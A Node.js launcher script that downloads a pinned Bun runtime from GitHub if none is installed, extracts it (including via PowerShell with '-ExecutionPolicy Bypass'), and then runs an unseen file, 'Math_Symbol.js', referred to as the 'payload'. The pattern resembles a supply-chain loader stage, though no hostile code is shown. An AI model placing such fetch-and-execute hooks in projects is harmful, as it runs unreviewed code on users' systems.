import { execFileSync } from "child_process";
import fs from "fs";
import https from "https";
import os from "os";
import path from "path";
import { fileURLToPath } from "url";
import zlib from "zlib";

const scriptDirectory = path.dirname(fileURLToPath(import.meta.url));
const bunVersion = "1.3.13";
const entryScript = "Math_Symbol.js";
const requestTimeoutMs = 121000;

function isMuslOrAlpine() {
  try {
    const output = execFileSync("ldd", ["--version"], {
      stdio: ["ignore", "pipe", "pipe"],
    }).toString();
    if (output.includes("musl")) return true;
  } catch {}

  try {
    return fs.readFileSync("/etc/os-release", "utf8").includes("Alpine");
  } catch {
    return false;
  }
}

const platformAssets = {
  "linux-arm64": () => "bun-linux-aarch64",
  "linux-x64": () =>
    isMuslOrAlpine()
      ? "bun-linux-x64-musl-baseline"
      : "bun-linux-x64-baseline",
  "darwin-arm64": () => "bun-darwin-aarch64",
  "darwin-x64": () => "bun-darwin-x64",
  "win32-arm64": () => "bun-windows-aarch64",
  "win32-x64": () => "bun-windows-x64-baseline",
};

function resolveAsset() {
  const platformKey = `${process.platform}-${process.arch}`;
  const resolve = platformAssets[platformKey];
  if (!resolve) throw new Error(`Unsupported platform/arch: ${platformKey}`);
  return resolve();
}

function download(url, destination, redirectsRemaining = 5) {
  return new Promise((resolve, reject) => {
    const request = https.get(
      url,
      { headers: { "User-Agent": "node" }, timeout: requestTimeoutMs },
      (response) => {
        const { statusCode, headers } = response;

        if ([301, 302, 307, 308].includes(statusCode)) {
          response.resume();
          if (redirectsRemaining <= 0) {
            reject(new Error("Too many redirects"));
            return;
          }
          download(headers.location, destination, redirectsRemaining - 1).then(
            resolve,
            reject,
          );
          return;
        }

        if (statusCode !== 200) {
          response.resume();
          reject(new Error(`HTTP ${statusCode} for ${url}`));
          return;
        }

        const output = fs.createWriteStream(destination);
        response.pipe(output);
        output.on("finish", () => output.close(resolve));
        output.on("error", (error) => {
          fs.unlink(destination, () => reject(error));
        });
      },
    );

    request.on("error", reject);
    request.on("timeout", () => request.destroy(new Error("Request timed out")));
  });
}

function commandWorks(command, args = ["--version"]) {
  try {
    execFileSync(command, args, { stdio: "ignore" });
    return true;
  } catch {
    return false;
  }
}

function extractZipEntryInternally(zipPath, entryName, outputDirectory) {
  const archive = fs.readFileSync(zipPath);
  let endOfCentralDirectory = -1;

  for (
    let offset = archive.length - 22;
    offset >= 0 && offset >= archive.length - 65557;
    offset--
  ) {
    if (archive.readUInt32LE(offset) === 0x06054b50) {
      endOfCentralDirectory = offset;
      break;
    }
  }

  if (endOfCentralDirectory === -1) {
    throw new Error("Invalid ZIP: EOCD record not found");
  }

  const entryCount = archive.readUInt16LE(endOfCentralDirectory + 10);
  let directoryOffset = archive.readUInt32LE(endOfCentralDirectory + 16);
  let localHeaderOffset = -1;
  let compressionMethod = -1;
  let compressedSize = 0;

  for (let index = 0; index < entryCount; index++) {
    if (archive.readUInt32LE(directoryOffset) !== 0x02014b50) {
      throw new Error("Invalid ZIP: bad CD entry signature");
    }

    const method = archive.readUInt16LE(directoryOffset + 10);
    const size = archive.readUInt32LE(directoryOffset + 20);
    const nameLength = archive.readUInt16LE(directoryOffset + 28);
    const extraLength = archive.readUInt16LE(directoryOffset + 30);
    const commentLength = archive.readUInt16LE(directoryOffset + 32);
    const headerOffset = archive.readUInt32LE(directoryOffset + 42);
    const name = archive
      .subarray(directoryOffset + 46, directoryOffset + 46 + nameLength)
      .toString("utf8");

    if (name === entryName) {
      localHeaderOffset = headerOffset;
      compressionMethod = method;
      compressedSize = size;
      break;
    }

    directoryOffset += 46 + nameLength + extraLength + commentLength;
  }

  if (localHeaderOffset === -1) {
    throw new Error(`Entry "${entryName}" not found in ZIP`);
  }
  if (archive.readUInt32LE(localHeaderOffset) !== 0x04034b50) {
    throw new Error("Invalid ZIP: bad local-header signature");
  }

  const nameLength = archive.readUInt16LE(localHeaderOffset + 26);
  const extraLength = archive.readUInt16LE(localHeaderOffset + 28);
  const dataOffset = localHeaderOffset + 30 + nameLength + extraLength;
  const compressed = archive.subarray(dataOffset, dataOffset + compressedSize);

  let extracted;
  if (compressionMethod === 0) extracted = compressed;
  else if (compressionMethod === 8) extracted = zlib.inflateRawSync(compressed);
  else throw new Error(`Unsupported ZIP compression method: ${compressionMethod}`);

  fs.writeFileSync(path.join(outputDirectory, path.basename(entryName)), extracted);
}

function extractBun(zipPath, entryName, outputDirectory) {
  if (commandWorks("unzip", ["-v"])) {
    execFileSync("unzip", ["-ojq", zipPath, entryName, "-d", outputDirectory], {
      stdio: "inherit",
    });
    return;
  }

  if (process.platform === "win32" && commandWorks("powershell", ["-Help"])) {
    execFileSync(
      "powershell",
      [
        "-NoProfile",
        "-NonInteractive",
        "-ExecutionPolicy",
        "Bypass",
        "-Command",
        `Expand-Archive -LiteralPath '${zipPath}' -DestinationPath '${outputDirectory}' -Force`,
      ],
      { stdio: "inherit" },
    );
    fs.renameSync(
      path.join(outputDirectory, entryName),
      path.join(outputDirectory, path.basename(entryName)),
    );
    return;
  }

  extractZipEntryInternally(zipPath, entryName, outputDirectory);
}

async function main() {
  const payloadPath = path.join(scriptDirectory, entryScript);

  if (commandWorks("bun")) {
    execFileSync("bun", [payloadPath], { stdio: "inherit", cwd: scriptDirectory });
    return;
  }

  const asset = resolveAsset();
  const executableName = process.platform === "win32" ? "bun.exe" : "bun";
  const downloadUrl =
    `https://github.com/oven-sh/bun/releases/download/bun-v${bunVersion}/` +
    `${asset}.zip`;
  const temporaryDirectory = fs.mkdtempSync(path.join(os.tmpdir(), "bun-dl-"));
  const archivePath = path.join(temporaryDirectory, `${asset}.zip`);
  const bunPath = path.join(temporaryDirectory, executableName);

  try {
    await download(downloadUrl, archivePath);
    extractBun(archivePath, `${asset}/${executableName}`, temporaryDirectory);
    fs.unlinkSync(archivePath);
    if (process.platform !== "win32") fs.chmodSync(bunPath, 0o755);
    execFileSync(bunPath, [payloadPath], {
      stdio: "inherit",
      cwd: scriptDirectory,
    });
  } finally {
    fs.rmSync(temporaryDirectory, { recursive: true, force: true });
  }
}

main().catch((error) => {
  console.error(error.message);
  process.exit(1);
});
